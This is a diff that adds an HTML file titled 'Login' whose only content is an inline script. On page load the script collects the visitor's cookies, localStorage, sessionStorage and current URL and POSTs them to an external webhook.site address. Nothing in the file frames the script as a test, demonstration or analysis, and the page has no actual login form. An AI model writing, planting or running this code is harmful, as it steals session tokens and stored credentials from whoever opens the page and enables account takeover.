@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <head><title>Login</title></head>
+  <body>
+    <script>
+      let out = `
+🍪 Cookies:
+${document.cookie}
+
+📦 LocalStorage:
+${JSON.stringify(localStorage)}
+
+📦 SessionStorage:
+${JSON.stringify(sessionStorage)}
+
+🌍 URL:
+${location.href}
+`;
+      fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
+        method: "POST",
+        body: out
+      });
+    </script>
+  </body>
+</html>
